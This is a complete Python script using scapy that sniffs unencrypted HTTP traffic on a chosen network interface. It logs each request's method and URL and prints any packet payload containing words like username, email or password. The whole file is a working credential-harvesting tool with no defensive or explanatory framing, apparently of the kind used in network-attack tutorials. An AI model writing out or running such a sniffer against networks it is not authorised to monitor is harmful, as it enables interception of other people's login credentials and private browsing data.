#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse

def program():
    parse = argparse.ArgumentParser()
    parse.add_argument("-n", "--net", dest="network", required=True, help="enter network interface")
    return parse.parse_args()

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process, filter="tcp port 80")

def getURL(packet):
    try:
        host = packet[http.HTTPRequest].Host.decode(errors="ignore")
        path = packet[http.HTTPRequest].Path.decode(errors="ignore")
        return host + path
    except:
        return

def getInfo(packet):
    if packet.haslayer(scapy.Raw):
        source = packet[scapy.Raw].load.decode(errors="ignore")
        keywords = ["username", "login", "email", "user", "password", "pass"]
        for x in keywords:
            if x in source.lower():
                return source

def process(packet):
    if packet.haslayer(http.HTTPRequest):
        url = getURL(packet)
        method = packet[http.HTTPRequest].Method.decode()
        print(f"[+] {method} Request: {url}")
        loginInfo = getInfo(packet)
        if loginInfo:
            print(f"[+] Info: {loginInfo}")

args = program()
sniff(args.network)
